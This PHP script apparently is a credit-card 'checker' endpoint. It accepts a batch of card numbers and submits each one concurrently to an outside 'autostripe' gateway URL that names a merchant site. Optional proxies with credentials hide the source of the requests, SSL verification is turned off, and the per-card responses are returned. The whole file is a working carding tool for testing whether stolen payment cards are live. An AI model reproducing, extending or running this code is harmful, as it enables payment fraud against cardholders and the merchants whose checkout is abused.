<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(60);
ini_set('max_execution_time', 60);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

error_log("[" . date('Y-m-d H:i:s') . "] Request received");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    error_log("[" . date('Y-m-d H:i:s') . "] Input: " . json_encode($input));
    
    $cards = $input['cards'] ?? [];
    $proxy = $input['proxy'] ?? '';
    $concurrency = $input['concurrency'] ?? 3;
    
    if (empty($cards)) {
        error_log("[" . date('Y-m-d H:i:s') . "] Error: Card data empty");
        echo json_encode(['error' => 'Card data is required', 'success' => false]);
        exit;
    }
    
    // Process cards with concurrency
    $results = processCardsConcurrently($cards, $proxy, $concurrency);
    
    echo json_encode([
        'success' => true,
        'results' => $results,
        'total_cards' => count($cards),
        'processed_cards' => count($results),
        'concurrency' => $concurrency
    ]);
} else {
    error_log("[" . date('Y-m-d H:i:s') . "] Invalid method: " . $_SERVER['REQUEST_METHOD']);
    echo json_encode(['error' => 'Invalid request method. Expected POST, got ' . $_SERVER['REQUEST_METHOD'], 'success' => false]);
}

function processCardsConcurrently($cards, $proxy, $concurrency = 3) {
    $results = [];
    $cardChunks = array_chunk($cards, $concurrency);
    
    foreach ($cardChunks as $chunk) {
        $mh = curl_multi_init();
        $handles = [];
        
        foreach ($chunk as $index => $cardData) {
            $apiUrl = 'https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc=' . urlencode($cardData);
            error_log("[" . date('Y-m-d H:i:s') . "] Processing card: " . substr($cardData, 0, 20) . "...");
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $apiUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            
            if (!empty($proxy)) {
                setupProxy($ch, $proxy);
            }
            
            curl_multi_add_handle($mh, $ch);
            $handles[$index] = [
                'handle' => $ch,
                'card' => $cardData
            ];
        }
        
        // Execute the multi handle
        $running = null;
        do {
            curl_multi_exec($mh, $running);
            curl_multi_select($mh);
        } while ($running > 0);
        
        // Process results
        foreach ($handles as $index => $data) {
            $ch = $data['handle'];
            $cardData = $data['card'];
            
            $response = curl_multi_getcontent($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            
            $results[] = [
                'card' => $cardData,
                'response' => $response,
                'http_code' => $httpCode,
                'error' => $error,
                'success' => !$error && $httpCode == 200,
                'proxy_used' => !empty($proxy)
            ];
            
            error_log("[" . date('Y-m-d H:i:s') . "] Card processed - HTTP Code: " . $httpCode . ", Error: " . ($error ?: 'none'));
            
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
        }
        
        curl_multi_close($mh);
        
        // Small delay between chunks to avoid rate limiting
        if (count($cardChunks) > 1) {
            usleep(100000); // 100ms delay
        }
    }
    
    return $results;
}

function setupProxy($ch, $proxy) {
    $proxyParts = explode(':', $proxy);
    $partCount = count($proxyParts);
    
    if ($partCount == 2) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (ip:port): " . $proxy);
    } elseif ($partCount == 4) {
        $proxyHost = $proxyParts[0] . ':' . $proxyParts[1];
        $proxyUser = $proxyParts[2];
        $proxyPass = $proxyParts[3];
        curl_setopt($ch, CURLOPT_PROXY, $proxyHost);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyUser . ':' . $proxyPass);
        error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (ip:port:user:pass): " . $proxyHost . " with auth");
    } else {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (unknown format): " . $proxy);
    }
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
}
?>